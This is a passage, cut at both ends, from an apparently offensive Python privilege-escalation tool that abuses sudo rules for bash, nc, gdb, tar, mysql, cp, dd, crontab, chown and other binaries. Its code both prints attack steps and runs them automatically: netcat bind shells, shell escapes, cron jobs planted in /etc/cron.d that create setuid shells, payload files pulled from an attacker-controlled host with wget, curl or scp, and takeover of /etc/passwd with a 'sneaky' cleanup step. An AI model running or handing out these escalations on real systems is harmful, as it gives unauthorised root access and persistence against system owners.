                call("sudo -u " + ruby_user + " ruby /tmp/pwn.rb", shell=True)

        if question == False:
            sudopwner()

# SUDO bash Rule Pwnage
def bash(bash_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (bash_user == "ALL") or (bash_user == "root"):
            print OKRED + "[*] sudo bash -i" + ENDC
        else:
            print OKRED + "[*] sudo -u " + bash_user + " bash -i" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the bash rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the bash rule now!!!" + ENDC
            print OKGREEN + "[+] Obtaining bash shell by passing the -i argument!" + ENDC

            if (bash_user == "ALL") or (bash_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo bash -i", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + bash_user + "!" + ENDC
                call("sudo -u " + bash_user + " bash -i", shell=True)

        if question == False:
            sudopwner()


# SUDO nc Rule Pwnage
def nc(nc_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First open a port using sudo and background it so you can connect to it in the same terminal: " + ENDC
        if (nc_user == "ALL") or (nc_user == "root"):
            print OKRED + " [*] sudo /bin/nc -lvp 8888 -e '/bin/bash' &" + ENDC
            print OKBLUE + "[2] Finally connect to that port using sudo: " + ENDC
            print OKRED + " [*] sudo /bin/nc -vvv 127.0.0.1 8888" + ENDC
        else:
            print OKRED + " [*] sudo -u " + nc_user + " /bin/nc -lvp 8888 -e '/bin/bash' &" + ENDC
            print OKBLUE + "[2] Finally connect to that port using sudo: " + ENDC
            print OKRED + " [*] sudo -u " + nc_user + " /bin/nc -vvv 127.0.0.1 8888" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:
    
        question = ask_user(OKRED + "\n[?] Do you wish to abuse the nc rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the nc rule now!!!" + ENDC
            if (nc_user == "ALL") or (nc_user == "root"):
                print OKGREEN + "[!] Opening port on 8888 as root" + ENDC
                call("sudo /bin/nc -lvp 8888 -e '/bin/bash' &", shell=True)

                print OKGREEN + "[!] Connecting to port on 8888 to obtain root shell!" + ENDC
                call("sudo /bin/nc -vvv 127.0.0.1 8888", shell=True)
            else:
                print OKGREEN + "[!] Opening port on 8888 as " + nc_user + ENDC
                call("sudo -u " + nc_user + " /bin/nc -lvp 8888 -e '/bin/bash' &", shell=True)

                print OKGREEN + "[!] Connecting to port 8888 to obtain shell as " + nc_user + "!" + ENDC
                call("sudo -u " + nc_user + " /bin/nc -vvv 127.0.0.1 8888", shell=True)
                

        if question == False:
            sudopwner()


# SUDO less Rule Pwnage
def less(less_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to open a file using the 'less' command: " + ENDC
    if (less_user == "ALL") or (less_user == "root"):
        print OKRED + " [*] sudo less <filename>" + ENDC
    else:
        print OKRED + " [*] sudo -u " + less_user + " less <filename>" + ENDC
    print OKBLUE + "[2] Once the file is open type '!/bin/bash': " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO more Rule Pwnage
def more(more_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to open a file using the 'more' command: " + ENDC
    if (more_user == "ALL") or (more_user == "root"):
        print OKRED + " [*] sudo more <filename>" + ENDC
    else:
        print OKRED + " [*] sudo -u " + more_user + " more <filename>" + ENDC
    print OKBLUE + "[2] Once the file is open type '!/bin/bash': " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO man Rule Pwnage
def man(man_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to view the man page of a Linux command: " + ENDC
    if (man_user == "ALL") or (man_user == "root"):
        print OKRED + " [*] sudo man bash" + ENDC
    else:
        print OKRED + " [*] sudo -u " + man_user + " man bash" + ENDC
    print OKBLUE + "[2] Once the page is open type '!/bin/bash': " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO gdb Rule Pwnage
def gdb(gdb_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious sh script to execute with gdb: " + ENDC
        print OKRED + " [*] echo '!/bin/bash' > /tmp/pwnage.sh" + ENDC
        print OKBLUE + "[2] Finally execute the script with gdb: " + ENDC
        if (gdb_user == "ALL") or (gdb_user == "root"):
            print OKRED + " [*] sudo gdb -batch -x /tmp/pwnage.sh" + ENDC
        else:
            print OKRED + " [*] sudo -u " + gdb_user + " gdb -batch -x /tmp/pwnage.sh" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the gdb rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the gdb rule now!!!" + ENDC
            print OKGREEN + "[!] Creating malicious file now!" + ENDC
            call("echo '!/bin/bash' > /tmp/pwnage.sh", shell=True)

            if (gdb_user == "ALL") or (gdb_user == "root"):
                print OKGREEN + "[!] Executing malicious script with gdb and getting root shell!" + ENDC
                call("sudo gdb -batch -x /tmp/pwnage.sh", shell=True)
            else:
                print OKGREEN + "[!] Executing malicious script with gdb and getting shell as " + gdb_user + "!" + ENDC
                call("sudo -u " + gdb_user + " gdb -batch -x /tmp/pwnage.sh", shell=True)

        if question == False:
            sudopwner()


# SUDO ftp Rule Pwnage
def ftp(ftp_user):
       
    # ADD AUTO PWNAGE STEPS 

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to execute the 'ftp' command: " + ENDC
    if (ftp_user == "ALL") or (ftp_user == "root"):
        print OKRED + " [*] sudo ftp" + ENDC
    else:
        print OKRED + " [*] sudo -u " + ftp_user + " ftp" + ENDC
    print OKBLUE + "[2] Once in the ftp prompt type the following: " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO smbclient Rule Pwnage
def smbclient(smbclient_user):
       
    # ADD AUTO PWNAGE STEPS 

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] Execute the 'smbclient' command, connecting to a valid SMB or CIFS share: " + ENDC
    if (smbclient_user == "ALL") or (smbclient_user == "root"):
        print OKRED + " [*] sudo smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC
    else:
        print OKRED + " [*] sudo -u " + smbclient_user + " smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC
    print OKBLUE + "[2] Once in the smbclient prompt (smb: \>), type the following: " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO sed Rule Pwnage
def sed(sed_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule we must use a insane argument that is only document in one place.... 'info sed' lol: " + ENDC
        if (sed_user == "ALL") or (sed_user == "root"):
            print OKRED + " [*] sudo sed e" + ENDC
        else:
            print OKRED + " [*] sudo -u " + sed_user + " sed e" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the sed rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the sed rule now!!!" + ENDC

            if (sed_user == "ALL") or (sed_user == "root"):
                print OKGREEN + "[!] Running sed with crazy 'e' argument to get root shell!" + ENDC
                call("sudo sed e", shell=True)
            else:
                print OKGREEN + "[!] Running sed with crazy 'e' argument to get shell as " + sed_user + "!" + ENDC
                call("sudo -u " + sed_user + " sed e", shell=True)

        if question == False:
            sudopwner()


# SUDO mysql Rule Pwnage
def mysql(mysql_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule we will execute mysql with the -e argument to execute system command: " + ENDC
        if (mysql_user == "ALL") or (mysql_user == "root"):
            print OKRED + " [*] sudo mysql -e '\! /bin/bash'" + ENDC
        else:
            print OKRED + " [*] sudo -u " + mysql_user + " mysql -e '\! /bin/bash'" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the mysql rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the mysql rule now!!!" + ENDC
            
            if (mysql_user == "ALL") or (mysql_user == "root"):
                print OKGREEN + "[!] Running mysql command with -e argument to get root shell!" + ENDC
                call("sudo mysql -e '\! /bin/bash'", shell=True)
            else:
                print OKGREEN + "[!] Running mysql command with -e argument to get shell as " + mysql_user + "!" + ENDC
                call("sudo -u " + mysql_user + " mysql -e '\! /bin/bash'", shell=True)

        if question == False:
            sudopwner()


# SUDO tar Rule Pwnage
def tar(tar_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule we will execute tar with the checkpoint and checkpoint-action argument to execute system command: " + ENDC
        if (tar_user == "ALL") or (tar_user == "root"):
            print OKRED + " [*] sudo tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash" + ENDC
        else:
            print OKRED + " [*] sudo -u " + tar_user + " tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the tar rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the tar rule now!!!" + ENDC

            if (tar_user == "ALL") or (tar_user == "root"):
                print OKGREEN + "[!] Running tar command with the checkpoint and checkpoint-action arguments to get root shell!" + ENDC
                call("sudo tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash", shell=True)
            else:
                print OKGREEN + "[!] Running tar command with the checkpoint and checkpoint-action arguments to get shell as " + tar_user + "!" + ENDC
                call("sudo -u " + tar_user + " tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash", shell=True)

        if question == False:
            sudopwner()


# SUDO wget Rule Pwnage
def wget():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
    print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
    print OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[3] Next we need to create a file in a web directory we control containing the file we will pull down and place in cron.d: " + ENDC
    print OKRED + " [*] Place this in a web directory you control: */1 * * * * root /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[4] Next we need to pull that file down into /etc/cron.d: " + ENDC
    print OKRED + " [*] sudo wget http://<ip>/pwnage -P /etc/cron.d/" + ENDC
    print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO curl Rule Pwnage
def curl():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
    print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
    print OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[3] Next we need to create a file in a web directory we control containing the file we will pull down and place in cron.d: " + ENDC
    print OKRED + " [*] Place this in a web directory you control: */1 * * * * root /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[4] Next we need to pull that file down into /etc/cron.d: " + ENDC
    print OKRED + " [*] sudo curl http://<ip>/pwnage -o /etc/cron.d/pwnage" + ENDC
    print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO mv Rule Pwnage
def mv():

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to create a file that will be placed in /etc/cron.d/ that will be executed: " + ENDC
        print OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC
        print OKBLUE + "[4] Next we need to put that file into /etc/cron.d: " + ENDC
        print OKRED + " [*] sudo mv /tmp/pwncron /etc/cron.d/pwncron" + ENDC
        print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()
    
    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the mv rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the mv rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Creating malicious cron file!" + ENDC
            call("echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running mv command tp move pwncron to /etc/cron.d/!" + ENDC
            call("sudo mv /tmp/pwncron /etc/cron.d/pwncron", shell=True)

            print OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!" + ENDC
            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO tee Rule Pwnage
def tee():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
    print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
    print OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[3] Next we need to create a file in /etc/cron.d/ with the tee command: " + ENDC
    print OKRED + " [*] sudo tee -a /etc/cron.d/pwn" + ENDC
    print OKBLUE + "[4] Enter the below data, hit enter, and exit the tee command: " + ENDC
    print OKRED + " [*] */1 * * * * root /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO scp Rule Pwnage
def scp():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
    print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
    print OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC
    print OKBLUE + "[3] Next we need to create a file on a remote machine that will be pulled into /etc/cron.d/: " + ENDC
    print OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC
    print OKBLUE + "[4] Finally we need to scp our pwncron file to our victim /etc/cron.d/ directory: " + ENDC
    print OKRED + " [*] sudo scp <user>@<attacker ip>:/tmp/pwncron /etc/cron.d/pwncron" + ENDC
    print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO ssh Rule Pwnage
def ssh(ssh_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by ssh." + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to execute SSH with ProxyCommand in order to execute our malicious script: " + ENDC
        if (ssh_user == "ALL") or (ssh_user == "root"):
            print OKRED + " [*] sudo ssh -o ProxyCommand='/tmp/./evil.sh' <user>@localhost" + ENDC
        else:
            print OKRED + " [*] sudo -u " + ssh_user + " ssh -o ProxyCommand='/tmp/./evil.sh' <user>@localhost" + ENDC
        print OKBLUE + "[5] Finally we wait execute the setuid shell in /tmp/!" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the ssh rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the ssh rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            if (ssh_user == "ALL") or (ssh_user == "root"):
                print OKGREEN + "\n[!] Running ssh command to execute malicious script as root!" + ENDC
                call("sudo ssh -o ProxyCommand='/tmp/./evil.sh' " + username + "@localhost", shell=True)
            else:
                print OKGREEN + "\n[!] Running ssh command to execute malicious script as " + ssh_user + "!" + ENDC
                call("sudo -u " + ssh_user + " ssh -o ProxyCommand='/tmp/./evil.sh' " + username + "@localhost", shell=True)

            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO cp Rule Pwnage
def cp():

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to create a file that will be placed in /etc/cron.d/ that will be executed: " + ENDC
        print OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC
        print OKBLUE + "[4] Next we need to put that file into /etc/cron.d: " + ENDC
        print OKRED + " [*] sudo cp /tmp/pwncron /etc/cron.d/pwncron" + ENDC
        print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the cp rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the cp rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Creating malicious cron file!" + ENDC
            call("echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running cp command to move pwncron to /etc/cron.d/!" + ENDC
            call("sudo cp /tmp/pwncron /etc/cron.d/pwncron", shell=True)

            print OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!" + ENDC
            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO dd Rule Pwnage
def dd():

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to create a file that will be placed in /etc/cron.d/ that will be executed: " + ENDC
        print OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC
        print OKBLUE + "[4] Next we need to put that file into /etc/cron.d: " + ENDC
        print OKRED + " [*] sudo dd if=/tmp/pwncron of=/etc/cron.d/pwncron" + ENDC
        print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the dd rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the dd rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Creating malicious cron file!" + ENDC
            call("echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running dd command to move pwncron to /etc/cron.d/!" + ENDC
            call("sudo dd if=/tmp/pwncron of=/etc/cron.d/pwncron", shell=True)

            print OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!" + ENDC
            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO crontab Rule Pwnage
def crontab():

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC
        print OKRED + " [*] echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC
        print OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC
        print OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC
        print OKBLUE + "[3] Next we need to create a file that will be placed in roots crontab: " + ENDC
        print OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC
        print OKBLUE + "[4] Next we need to add that cron to roots crontab: " + ENDC
        print OKRED + " [*] sudo sudo crontab /tmp/pwncron" + ENDC
        print OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the crontab rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the crontab rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious file!" + ENDC
            call("echo 'cp /bin/ksh /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Creating malicious cron file!" + ENDC
            call("echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron",shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] Running crontab command!" + ENDC
            call("sudo crontab /tmp/pwncron", shell=True)

            print OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!" + ENDC
            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO chown Rule Pwnage
def chown():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First we need to change the ownership of /etc/passwd (TAKE NOTE OF YOUR UID FIRST): " + ENDC
    print OKRED + " [*] sudo chown " + username + ":root /etc/passwd" + ENDC
    print OKBLUE + "[2] Now that we own /etc/passwd we can edit it and change our UID to 0: " + ENDC
    print OKRED + " [*] vim /etc/passwd (Change your UID to 0)" + ENDC
    print OKBLUE + "[3] Next logout and log back in. You will notice your UID is now 0 and have root level access." + ENDC
    print OKBLUE + "[4] To be sneaky we can change the file back to being owned by root: " + ENDC
    print OKRED + " [*] sudo chown root:root /etc/passwd" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO chmod Rule Pwnage
def chmod():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First for safety purposes we need to get the current permissions of /etc/passwd (HINT: SHOULD BE 644): " + ENDC
    print OKRED + " [*] stat -c '%a %n' /etc/passwd" + ENDC
